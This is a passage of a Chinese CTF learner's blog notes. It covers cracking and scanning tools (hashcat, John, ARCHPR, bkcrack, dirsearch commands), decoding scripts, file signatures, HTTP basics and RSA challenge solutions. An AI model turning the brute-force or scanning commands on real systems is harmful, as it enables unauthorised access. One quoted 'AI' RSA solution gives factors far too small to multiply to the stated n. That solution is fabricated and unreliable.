--current-db\n```\n#### 官方文档：<https://github.com/sqlmapproject/sqlmap/wiki/Usage>\n## RDP缓存文件 \n- bmc-tools：该工具用于分析RDP缓存文件*.bmc文件命令如下：\n```bash\npython bmc-tools.py -s \"文件路径.bmc\" -d 输出路径\n```\n- RdpCacheStitcher：该工具实现对上一步生成的*.bmp图片文件进行拼接：\n\n\n## 文本处理（文件里叫“文本编辑器”）\n![alt text](../img/ctf工具箱内容学习_image.png)\n- 010Editor\n- winhex\n  - ctrl+n新建文件\n---\n## 编码解码\n![alt text](/img/ctf工具箱内容学习_1-3-1.png)\n- 因式分解（yafu打开cmd使用，\n  - 分解因数n：`.\\yafu-x64.exe \"factor(n)\"`\n  - [bilibili速成crypto视频学习笔记](/2025/10/18/bilibili速成crypto视频学习笔记)\n  - RSA常见脚本：\n```python\nfrom Crypto.Util.number import *\n\nn = p*q\nphi = (p-1)*(q-1)\nd = inverse(e,phi)\nm = pow(c,d,n)\nprint(long_to_bytes(m))\n```\n- CyberChef：解码编码插件，有搜索功能，魔法棒好用\n- 随波逐流7.0\n- 轩禹RSA\n\n\n\n\n- 与佛论禅（字面意思）\n- AZdecrypt：Z340黄道十二宫密码破解软件\n使用：python移位+软件左框输入解密\n```python\ns = '''\n%,,@*>@?==%88%5\n,@%#@@90-7$^=*@\n17,(>()1@##-\\$40\n~,*6?#%#8#=75+1\n(*@*1%#>,0@5)%?\n%*^=)&>=1%,+7&#\n8681(+8*@@(,@@@\n#*=#\\$3*#%,#%%,3\n,*+7,7+@===+)61\n'''\n \ns = s.strip()\n \narr = s.split('\\n')\n \nfor n in range(1, 16):\n    tmp_s = ''\n \n    for index, value in enumerate(arr):\n        i = (2 * index + n) % 15 - 1\n        tmp_s += value[i]\n \n    print(tmp_s)\n```\n\n\n\n- hashcat：cmd命令工具，具体用法是：右键打开文件位置然后打开此处cmd，kali中自带！！！\n  - <https://cloud.tencent.com/developer/article/2187201>\n  - 嗯，不是我现在用得上的高级东西，先浅放个使用方法网页，网页打不开去image文件夹找图片。\n  - <https://www.cnblogs.com/Junglezt/p/16044372.html>\n  - 后面搜索到的使用文档\n- RSATool：网上没找到，遇到题目再说\n- Converter：功能有点鸡肋，尝试一个题目，直接卡死了\n- CTFcrack：额离谱旧电脑显示皮下是stegsolve，实则是解码工具（后续再补充\n- CTF-Tools（原按钮失效，已删除重新添加exe文件可使用）\n\n![alt text](/img/ctf工具箱内容学习_CTF-Tools.png)\n- Base64（字面意思）\n- 破空3.3\n  - 功能：\n    - 查找到flag其他模式可以右键转换（结果去哪了还不清楚）\n    - 文件可以直接拖进去\n  - 注意：\n    - 关键字编码即将flag的base64编码、16进制一起搜索，但只对字符格式有效；\n    - 网页查找智能用正则匹配\n\n\n\n- CaptfEncoder：解码编码，有搜索功能\n- Apocalypso：解码编码\n- RSATool2v110：\n  - P、Q、R、D、E 分别就是 RSA 算法中的 p、q、N、d、e，右上角选择进制，注意：e 只有十六进制可用，左下角有一个 Factor N 的按钮，这是分解 N 的意思，点一下，会自动开始分解因数，得到 P、Q，Calc.D是计算按钮\n- MixedCS：DES加密软件\n- 5bit编码：字面意思\n- SSLEye：编码解码工具，没有搜索功能\n![alt text](/img/ctf工具箱内容学习_SSL.png)\n- 在线。。。：字面意思\n- Ookbrainfuck：两种编码在线网站\n  - Ook! has only three distinct syntax elements:\n    - Ook.   /   Ook?   /   Ook!\n  - Brainfuck语言用> < + - . , [ ]八种符号来替换C语言的各种语法和命令\n- brainfuck：字面意思吧但网页看不懂怎么操作\n- 摩斯密码：好像打不开。。\n- quip词频分析：Quipqiup 是一个快速且自动化的密码求解器 by 埃德温 奥尔森。它可以解决常见的简单替换密码在报纸上，包括像 Cryptoquips 这样的谜题（在哪个词中边界被保留）。（遇到题目再说咯）\n- Playfair：（字面意思Playfair解码网站）\n- hillcipher：同上\n- malbolge：Malbolge 由 Ben Olmstead 于 1998 年发明，是一种深奥的编程语言，旨在尽可能难以编程。事实就是这样：-）（什么鬼东西哦编程在线网页？\n- Wingdings：将常规英文文本转换为可复制和粘贴的 Wingdings 文本\n- 双hex：（字面意思two hex解码网站）\n- 维吉利亚：\n![alt text](/img/ctf工具箱内容学习_V.png)\n1.  0宽1、0宽2、emoji-aes：打不开\n---\n\n\n\nRStudioProtable\n- 打开镜像导入文件，新建虚拟快RAID和自动检测，拖拽镜像文件，自动检测\n\n![alt text](/img/第三届长安杯笔记_6-15.png)\n- 火眼依据信息导入\n\n![alt text](/img/第三届长安杯笔记_6-16.png)\n\nlovelymem\n- pid：v3-window.pslist\n- 汇出指定PID的程序：window.cmdline-右键导出为可执行文件vol3\n- hash：lmhash（已废弃），nthash（现用）\n\nbackdex\n- 模拟器里已经下载，分32和64位，反编译要区分是哪种\n\n身份证归属地查询软件\n\ndie\n- 查看exe文件使用的编程语言\n- 基址\n- 编译时间\n\nwatermark\n- 隐形水印加密\n\nCTF-neta\n- 流量抓取输入记录\n\nwireshark\n- 导出为json便于搜索\n```\ntshark -r E:\\平航杯工作位置\\BLE.pcapng -T json > BLE.json\n```\n- 搜索脚本（但要在官网找字段名【待】）\n```python\nimport re\ndef extract_device_names(file_path):\n    # 设备名称的集合（自动去重）\n    device_names = set()\n    # 正则表达式模式，用于匹配设备名称\n    pattern = re.compile(r'\"btcommon\\.eir_ad\\.entry\\.device_name\":\\s*\"([^\"]+)\"')\n    with open(file_path, 'r', encoding='utf-8') as file:\n        for line in file:\n            # 在每一行中查找所有匹配项\n            matches = pattern.findall(line)\n            for match in matches:\n                # 将找到的设备名称添加到集合中（自动处理重复）\n                device_names.add(match)\n            # 输出结果\n    print(\"提取的设备名称列表：\")\n    for name in sorted(device_names):  # 按字母顺序排序输出\n        print(name)\n# 文件路径\nfile_path = \"BLE.json\"\nextract_device_names(file_path)\n```\n\n## 暴力破解\n![alt text](../img/ctf工具箱内容学习_1-1.png)\n![alt text](/img/ctf工具箱内容学习_1-1.png)\n1. Ziperello：暴力破解zip文件密码/字典/模板，但没有字典只能破解六位密码\n2. pkcrck不知道为什么电脑不能打开可能是win32版本所以打不开，但网上没找到其他版本的（待）\n3. ARCHPR：暴力破解/字典/掩码（不确定的地方打上？就行）\n---\n\n\n## 爆破工具\n- bkcrack\n  - `bkcrack -C encrypted.zip -c cipher -P plain.zip -p plain`\n![alt text](/img/ctf工具箱内容学习_1-4.png)\n1. Bruter：爆破密码，ip+user用户名+dictionary\n2. John：使用方式看下面网址，打不开看images文件夹，kali自带\nhttps://www.cnblogs.com/Junglezt/p/16048189.html\n1. phpMyAdmin：字面意思暴力破解用户名密码\n2. t00ls：看不懂搜不到跳过\n3. 。。。都看不懂，遇到题目再说好了\n---\n## 密码工具\n（太多了bushi先放着）\n\n## 目录扫描\n### dirsearch\n- 虚拟环境`.\\dirsearch_env\\Scripts\\activate.bat`\n- `pip install cryptography==3.4.8`\n\n- 使用方法：\n```python\npython dirsearch.py -u http://xxxx # 日常使用\npython dirsearch.py -u http://xxxx -r # 递归扫描，不过容易被检测\npython3 dirsearch.py -e php,txt,zip -u https://target # 简单的查看网址目录和文件\n```\n- 参考：<https://blog.csdn.net/m0_48574718/article/details/129244162>\n\n","tags":["ctf","工具"],"categories":["ctf工具"]},{"title":"python代码和bat自动化存档","url":"/2025/08/17/python代码和bat自动化存档/","content":"\n## bat文件\n```\n@echo off\npython \"python文件绝对路径\\文件名.py\" & pause\n```\n>注意：\n>1）另存为时编码保存为ANSI，防止乱码\n>2）引号必须是英文引号\n\n## 实现进制与字符串转换的python代码\n```\nastart = input('输入待处理数字或字符串：')\n#a = int(astart)\nbs = input('输入选择：1=数字2=字符串')\nb = int(bs)\nif b == 1:\n    c = int(input('数字是1=二进制2=十进制3=十六进制4=八进制'))\n    if  c == 1:\n        a10 = int(astart,2)\n        print('转为十进制为：',a10,'\\n转为八进制0o为：',oct(a10),'\\n转为十六进制0xc为：',hex(a10))\n    elif c == 2:\n        a = int(astart)\n        a10 = a\n        print('转为二进制0b为：',bin(a),'\\n转为八进制0o为：',oct(a),'\\n转为十六进制0xc为：',hex(a))\n    elif c == 3:\n        a10 = int(astart,16)\n        print('转为十进制为：',a10,'\\n转为八进制0o为：',oct(a10),'\\n转为十六进制0xc为：',hex(a10))\n    elif c == 4:\n        a10 = int(astart,8)\n        print('转为十进制为：',a10,'\\n转为八进制0o为：',oct(a10),'\\n转为十六进制0xc为：',hex(a10))\n    by = a10.to_bytes((a10.bit_length() + 7) // 8, 'big')   # 大端\n    print('转为字符串为：',by)\nelif b == 2:\n    a2 = astart.encode('utf-8')\n    a2_10 = int.from_bytes(a2,'big')\n    print('转为二进制0b为：',bin(a2_10),'\\n转为八进制0o为：',oct(a2_10),'\\n转为十六进制0xc为：',hex(a2_10),'\\n转为十进制为：',a2_10)\n```\n\n## 换表base64\n```python\nimport base64\nimport string\n\nstr1 = \"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\"\n\nstring1 = \"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\"\nstring2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n\nprint (base64.b64decode(str1.translate(str.maketrans(string1,string2))))\n```\n- str1是要解密的代码，string1是改过之后的base64表\n\n## 十六进制倒转脚本\n```python\ninput = open('flag.jpg', 'rb')\ninput_all = input.read()\nss = input_all[::-1]\noutput = open('m0re.jpg', 'wb')\noutput.write(ss)\ninput.close()\noutput.close()\n```\n\n## 端序转换\n```python\ndef swap_groups(b, w):\n    return b''.join(b[i:i+w][::-1] for i in range(0, len(b), w))\n\ndef show(b, w):\n    out = swap_groups(b, w)\n    print(f'[{w}] hex:', out.hex())\n    try:\n        print(f'[{w}] text:', out.decode('utf-8'))\n    except:\n        print(f'[{w}] text:', '(invalid utf-8)')\n\ndef main():\n    while True:\n        s = input('文本(回车退出): ')\n        if s == '':\n            break\n        raw = s.encode('utf-8')\n        for w in (1, 2, 3, 4):\n            show(raw, w)\n        sel = input('选择字节分组(1-4或正整数，默认1): ').strip()\n        try:\n            w = int(sel) if sel else 1\n            if w <= 0:\n                w = 1\n        except:\n            w = 1\n        out = swap_groups(raw, w)\n        print('选定分组:', w)\n        print('hex:', out.hex())\n        try:\n            print('text:', out.decode('utf-8'))\n        except:\n            print('text:', '(invalid utf-8)')\n\nif __name__ == '__main__':\n    main()\n```","tags":["ctf"],"categories":["知识点笔记"]},{"title":"js 笔记","url":"/2025/08/17/js-笔记/","content":"\n原先运行环境是网页，现在node能够模仿，所以本地运行需要下载node。\n具体（在VScode中编辑）：\n1新建html文件，！+Tab获得：\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <h1 >Hello World!</h1>\n    <script src=\"文件名.js\"></script>\n</body>\n</html>\n```\n<body>处需要手动编辑：\n1）h1+Tab获得<h1 ></h1>标签，中间可编辑；\n2）script+Tab获得<script></script>标签，中间可编辑，但正常使用引用.js文件方式编辑，具体如上述代码。\n\n2 javascript语法粗略学习\n1. 打印函数\n```\nconsole.log('hello world');\n```\n\n1. 变量：var全局变量,let可修改,const不可修改赋值对象\n\n2. 原生数据类型：string,number包括小数,boolean,null,undefined \n3) undefined定义方法不是const而是：\n```\nlet 变量名\n```\n1) 类型检验方式：\n```\nconsole.log(typeof 变量名);\n```\n此时null输出object\n1) string\n1、打印方法（新/旧）\n```\nconsole.log('123'+变量名);\n//模板字符串 新方法：\nconst hello = `Myname is ${变量名}`; \nconsole.log(hello);\n```\n2、内置方法\n```\n//变量名.length\n//.toUpperCase()/.toLowerCase大小写\n//.substring(a,b)截取[a,b)；并且可以后面叠加（如大小写）\n//.split('')分割成数组 最小以字母为单位 ‘’内传入分割依据\n```\n\n1. 数组\n```\n//1）构造方法\n//const 变量名 = new Array(1,2,3,4);\n//const 变量名 = [1,'1',true];\n//2）索引\n//数组名[1]可直接获取/赋值\n//数组名.unshift('dhkaju')在最后加入数组\n//数组名.pop()删除最后\n//判断是否为数组Array.isArray(数组名)为bool值\n//数组名.indexOf('数组内容')为数组内容索引号\n```\n\n1. 对象\n```\n//const 对象名 = {}\n//属性可以TAB明确级别\n//调用\n//      对象名.属性名1，属性名2\n//      对象名.属性名1，属性名1.1\n//      对象名.属性名1[1]\n//剩余先跳过未学习\n```\n\n1. if\n```\nif (条件句){\n    内容\n}else{\n    内容\n}\n//条件句：===同时判断类型是否相同，==只判断内容\n//      ||或 &&且\n```\n\n1. 三目运算符\n```\nconst color = x > 10 ? 'red' : 'blue';\n//x > 10时color = 'red'反之'blue'\n```\n\n1. swith条件语句\n```\nswitch(color){\n    case 'red':\n        break;\n    default 'blue':\n        break;\n}\n```\n\n1. for while循环\n```\nfor (let i = 0;i <= 10; i++){\n    内容\n}\n//\nlet i = 0\nwhile(i < 10){\n    内容\n    i++;\n}\n```","tags":["javascript"],"categories":["语法笔记"]},{"title":"十六进制文件头尾特征","url":"/2025/08/16/十六进制文件头尾特征/","content":"## gif\n```\n47 49 46 38 39 61\n```\n## JPEG 图像文件\n```\nFFD8 FFE0 0010 4A46 4946 0001 0101 0047 ...\n```\n- FFD8 表示 JPEG 文件的开始，FFE0 代表应用程序特定标记，4A46 4946 表示 \"JFIF\" 标识。\n```\n... FFD9\n```\n\n## PNG 图像文件\n- PNG图像格式文件由一个8字节的PNG文件标识域和3个以上的后续数据块如:IHDR、IDAT、IEND等组成\n```\n8950 4E47 0D0A 1A0A ...\n```\n- 89：用于检测传输系统是否支持8位的字符编码，用以减少将文本文件被错误的识别成PNG文件的机会，反之亦然\n- 50 4E 47：PNG每个字母对应的ASCII，让用户可以使用文本编辑器查看时，识别出是PNG文件\n- 0D 0A：DOS风格的换行符，用于DOS-Unix数据的换行符转换\n- 1A：在DOS命令行下，用于阻止文件显示的文件结束符\n- 0A：Unix风格的换行符，用于Unix-DOS换行符的转换\n```\n... 0000 0000 4945 4E44 AE42 6082\n```\n4945 4E44 对应 ASCII 编码的 IEND，AE42 6082 是 CRC 校验码。\n\n\n\n\n## PDF 文档\n以 %PDF 开头，具体的十六进制表示如下：\n```\n2550 4446 2D31 2E3X ...\n```\n2550 4446 对应 ASCII 编码的 %PDF，2D31 2E3X 代表 PDF 的版本号。\n文件尾通常包含 %%EOF 标记，具体的十六进制表示如下：\n```\n... 2525 454F 46\n```\n2525 454F 46 对应 ASCII 编码的 %%EOF。\n\n## DOC 文件（Microsoft Word 97-2003）\n```\nD0 CF 11 E0 A1 B1 1A E1 ...\n```\n这个签名是 Microsoft 复合文件二进制格式（Compound File Binary Format, CFBF）的标志，常用于旧版 Microsoft Office 文档。\n文件尾没有固定的模式，但通常包含结束标记，如 00 00 00 00。\n\n## DOCX 文件/ZIP文件（Microsoft Word 2007+）\nDOCX 文件是基于 XML 的文件格式。\n```\n50 4B 03 04 ...\n```\n这个签名表示 ZIP 压缩文件格式，因为 DOCX 文件实际上是 ZIP 压缩的 XML 文件。\n文件尾通常以 ZIP 文件的结束标记结束：\n```\n... 50 4B 05 06\n```\n\n## TXT 文件\n没有固定的文件头，因为只是纯文本文件，有些文本文件可能以特定的字符编码（如 UTF-8）开始：\n```\nEF BB BF ...\n```\n这是 UTF-8 编码的字节顺序标记（BOM）。\n通常没有固定的文件尾。\n\n## MOV 视频文件\n```\n00 00 00 14 66 74 79 70 71 74 20 20 ...\n```\n66 74 79 70 对应 ASCII 编码的 ftyp，表示文件类型。\n文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。\n\n## MP4 视频文件\nMP4 文件的文件头与 MOV 文件类似，也以 ftyp 开头，但后续字节可能有所不同：\n```\n00 00 00 18 66 74 79 70 6D 70 34 32 ...\n```\n6D 70 34 32 对应 ASCII 编码的 mp42，表示 MPEG-4 第2版。\n文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。\n\n-----------------------------------\n©著作权归作者所有：来自51CTO博客作者陈锋爱吃菠萝的原创作品，请联系作者获取转载授权，否则将追究法律责任（联系中）\n十六进制文件头和文件尾：文件取证和恢复的关键\nhttps://blog.51cto.com/u_15763679/11200825","tags":["ctf","misc"],"categories":["知识点笔记"]},{"title":"ctf 碎片知识整理","url":"/2025/08/16/ctf-碎片知识整理/","content":"# 零碎知识点\n## 1. HTTP请求包（浏览器信息）\n我们先看看Request包的结构, Request包分为3部分，第一部分叫Request line（请求行）, 第二部分叫Request header（请求头）,第三部分是body（主体）。header和body之间有个空行，请求包的例子所示:\n```\nGET//请求行: 请求方法 请求URL HTTP协议/协议版本\nHost：//服务端的主机名\nUser-Agent：//浏览器信息\nAccept：//客户端能接收的MIME\nAccept-Encoding：//是否支持流压缩\nAccept-Charset：//客户端字符编码集\n//空行,用于分割请求头和消息体\n//消息体,请求资源参数,例如POST传递的参数\n```\nHTTP协议定义了很多与服务器交互的请求方法，最基本的有4种，分别是GET,POST,PUT,DELETE。一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，增，改，删4个操作。我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。\n\nGET和POST的区别:\n> 1. 我们可以看到GET请求消息体为空，POST请求带有消息体。\n> 2. GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&相连，如EditPosts.aspx?name=test1&id=123456。POST方法是把提交的数据放在HTTP包的body中。\n> 3. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制。\n> 4. GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码\n\nHTTP响应包（服务器信息）\n我们再来看看HTTP的response包，他的结构如下：\n```\nHTTP/1.1 200 OK\t\t\t\t\t\t//状态行\nServer: nginx/1.0.8\t\t\t\t\t//服务器使用的WEB软件名及版本\nDate:Date: Tue, 30 Oct 2012 04:14:25 GMT\t\t//发送时间\nContent-Type: text/html\t\t\t\t//服务器发送信息的类型\nTransfer-Encoding: chunked\t\t\t//表示发送HTTP包是分段发的\nConnection: keep-alive\t\t\t\t//保持连接状态\nContent-Length: 90\t\t\t\t\t//主体内容长度\n//空行 用来分割消息头和主体\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"... //消息体\n```\nResponse包中的第一行叫做状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。\n状态码用来告诉HTTP客户端,HTTP服务器是否产生了预期的Response。\nHTTP/1.1协议中定义了5类状态码， 状态码由三位数字组成，第一个数字定义了响应的类别\n> 1XX 提示信息 - 表示请求已被成功接收，继续处理\n> 2XX 成功 - 表示请求已被成功接收，理解，接受\n> 3XX 重定向 - 要完成请求必须进行更进一步的处理\n> 4XX 客户端错误 - 请求有语法错误或请求无法实现\n> 5XX 服务器端错误 - 服务器未能实现合法的请求\n————————————————\n版权声明：本文为CSDN博主「hespecial」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/m0_50376770/article/details/132438222\n\n## 2. 报错解决：error: externally-managed-environment\n方法1：安装venv虚拟环境（网上推荐但失败）\n方法2：安装pipx，成功但使用不便\n方法3：强行避免报错\n具体：\n原来安装代码：pip install 对象名\n现在安装代码：pip install --break-system-packages 对象名\n\n## 3. 报错解决：E：invalid opertion install\n更换源代码：\nsudo add-apt-repository main\nsudo add-apt-repository universe\nsudo add-apt-repository restricted\nsudo add-apt-repository multiverse\nsudo apt-get update\n\n## 4. 零宽隐写\nhttps://tool.bfw.wiki/tool/1695021695027599.html\n注意：用ctrl+A复制\n\n## 5. 要注意文件可以与文字xor!!!\n\n![alt text](/img/ctf-零散writeup_9.png)","tags":["ctf"],"categories":["知识点笔记"]},{"title":"软件下载方法存档","url":"/2025/08/12/软件下载方法存档/","content":"\n### 软件名：yaki\n用途：ctf web\n下载官网：https://yaklang.com/\n使用文档：https://yaklang.io/products/intro/\n\n![alt text](/img/软件下载方法存档_yaki.jpeg)\n### 软件名：QRresearch\n用途：ctf misc\n下载地址：https://wwws.lanzouy.com/iRLUn11jc12h或者百度网盘电脑存档文件夹内获取\n\n### mysql\n- 小皮面板，<https://blog.csdn.net/liKeQing1027520/article/details/136027350>\n\n### IDA mcp\n- <https://mp.weixin.qq.com/s/8sS-CAjJYYLFmaqVU8NgUw>\n- 3.11的python\n- uv下载\n\n### burpsuite+chroome\n- <https://www.jianshu.com/p/eba4077ab1ef>\n\n### python23共存\n- pip23共存\n  - 报错Fatal error in launcher: Unable to create process using '\"E:\\python\\python.exe\"  \"E:\\python\\Scripts\\pip.exe\" list': ???????????\n    - <https://developer.aliyun.com/article/626782>\n    - 解决办法-改用如下命令：\n```bash\n# Python2 安装：\npython2 -m pip install XXX\n# Python3 安装\npython3 -m pip install XXX\n```\n\n### cipher\n- 所有命令中`ciphey`用下方文字代替\n```\ne:\\ciphey-venv38\\Scripts\\ciphey.exe\n```\n- `e:\\ciphey-venv38\\Scripts\\ciphey.exe -t ''`","tags":["存档","新电脑部署"],"categories":["存档"]},{"title":"LSB隐写题目解法","url":"/2025/08/11/LSB隐写题目解法/","content":"\n![alt text](/img/LSB隐写题目解法_LSB.jpg)","tags":["ctf","LSB","图片隐写"],"categories":["知识点笔记"]},{"title":"rsa 初步学习笔记","url":"/2025/08/09/rsa-初步学习笔记/","content":"\n1 因数，质数，余数\n\n2 公钥，私钥\n1）制作过程：\n![alt text](/img/rsa-初步学习笔记_4.png)\n2） 实际操作过程：\n![alt text](/img/rsa-初步学习笔记_5.png)\n\n3 工具\n1）https://factordb.com/\n分解n工具，注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现\n\n\n****具体题目：****\n· 来源：spc学长xc\n基础rsa，在python中使用inverse()函数\n```\n#from Crypto.Util.number import *\n#from secret import flag\n#m = bytes_to_long(flag)\n#p = getPrime(512)\n#q = getPrime(512)\n#e = 65537\n#n = p*q\n#c = pow(m,e,n)\n#print(f'p = {p}')\n#print(f'q = {q}')\n#print(f'c = {c}')\n\np = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073\nq = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451\nc = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057\n\n#最终解决方法：\nfrom Crypto.Util.number import long_to_bytes, inverse\ne = 65537          \nn = p * q\nt = (p - 1) * (q - 1)\nd = inverse(e, t)\nm = pow(c, d, n)\n\nflag = long_to_bytes(m)\nprint(flag.decode())   \n\n```\n\n· 来源：spc学长xc\n题目提示：大数N的分解\n题目：\n```\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom serct import flag\np = getPrime(512)\nq = getPrime(512)\nn = p*q\nm = bytes_to_long(flag)\ne = 65537\nc = powmod(m, e, n)#加密结果    \nprint(n)\nprint(c)\n\n# 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153\n# 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069\n```\n\nAI解法：\n拿到题目后，我们手里只有n ，c ，e，但没有 p 和 q ，所以第一步就是分解 n。\n1. 先直接上 yafu / factordb\n（注意！！！分解时要求P*Q=N，且注意P跟Q的bit特征，在此题当中只有512bit）\n```\np = 72224896773450610791657349018700642791668283264384520670702825479122904864127\nq = 72224896773450610791657349018700642791668283264384520670702825479122904864239\n```\n（这两个数只差 112，所以 yafu 的 ECM / SIQS 都能秒破。）（yafu下载后卡死【待解决】\n\n2. 有了 p、q，就能算私钥 d\n\n```\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\nn = 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153\nc = 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069\ne = 65537\n\np = 72224896773450610791657349018700642791668283264384520670702825479122904864127\nq = 72224896773450610791657349018700642791668283264384520670702825479122904864239\n\nassert p * q == n\n#校验等式是否成立\n\nphi = (p - 1) * (q - 1)#欧拉函数\nd = invert(e, phi)#e*d≡1mod phi\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```\n（这题就是典型的“p、q 距离太近”导致用 Fermat 方法或 ECM 就能秒分解。）（这两个方法是什么？\n\n\n\n· 来源：spc学长xc\n```\nfrom Crypto.Util.number import *\n\nm = bytes_to_long(b'flag{******}')\n\np = getPrime(512)\nq = getPrime(512)\nr = getPrime(512)\n# 分别独立地生成 3 个 512 bit（≈154 位十进制）的随机强素数 p、q、r。这三个素数就是后面多素数 RSA 的因子。\n\nh1 = 1*p + 1*q + 1*r\nh2 = 2*p + 3*q + 3*r\nh3 = 9*p + 9*q + 6*r\nprint( \"hint_of_pqr=\" , h1 , h2 , h3 )\n# h1,h2,h3可求出pqr的值\n\ne = getPrime(64)\n# 生成一个 64 bit 的随机素数 e，用作 RSA 公钥指数。\n\na_big_prime = getPrime( 512 )\n# 再生成一个 512 bit 的随机素数，起名叫 `a_big_prime`。\n# 注意：这个名字有误导性，它并不是 RSA 模数 N 的因子，只是额外生成的一个素数，用来产生另一条“hint”（？什么鬼\n\nhint = pow(a_big_prime,e,2**512)\n#计算\n# pow（a,b,c）=（a^b）%c\n# 在 CTF 语境里，这往往暗示“partial key exposure”——低 512 位泄漏\n# 攻击者可用 Coppersmith/Howgrave-Graham lattice 方法恢复完整私钥。\n# 不过本题真正解密不需要它，因为 e 很小且 n 的因子我们已能求出。\n\nprint( \"the big prime is: \" , a_big_prime )\nprint( \"hint is:\" , hint )\n\nn = p*q*r\n# 构造一个 3 素数 RSA 模数 n，长度 3×512 = 1536 bit。\nc = pow( m , e , n )\nprint( \"c=\" , c )\n# 输出密文 c\n\n'''\nhint_of_pqr= 26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427\n66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144 213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946\nthe big prime is:  11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921\nhint is: 10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505\nc= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711\n'''\n```\n自己解出来了但方法过于复杂，无参考价值，所以只保留学长wp作为存档。\n```\nfrom Cryptodome.Util.number import long_to_bytes as l2b\nimport sympy\n\nh1 =  26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427\nh2 =  66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144\nh3 =  213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946\na_big_prime =   11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921\nhint =  10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505\nc= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711\n#解方程\np = 3*h1 - h2\nr = (9*h1 - h3)//3\nq = h1 - p -r\n\n#解e\ne = sympy.discrete_log(2**512,hint,a_big_prime)\n\n#rsa算法\nn = p*q*r\nfain = (p-1)*(q-1)*(r-1)\nd = pow(e,-1,fain)\nm = pow(c,d,n)\nprint(l2b(m))\n```\n- 后续笔记见[bilibili速成crypto视频学习笔记](/2025/10/18/bilibili速成crypto视频学习笔记)","tags":["ctf","crypto","rsa"],"categories":["知识点笔记"]},{"title":"电脑求助存档","url":"/2025/08/07/电脑求助存档/","content":"2025-08-03 \n****问题：openlist挂载卡在使用raildrive mount进行其集成网盘映射至本地文件夹一步****\n解决：取消勾选网络https://选项\n反思：看攻略不够仔细，攻略中有这一步漏了\n\n2025-08-03\n****问题：openlist自启动文件失败****\n解决：没有放在同级文件夹\n反思：自动文件如.bat后缀文件，需要注意是否有放置位置要求\n\n2025-08-03\n****问题：桌面出现观看视频名称，具体表现为网页观看任一视频出现名称在桌面左上角，且位于fence分类界面下方****\n解决：是wallpaper 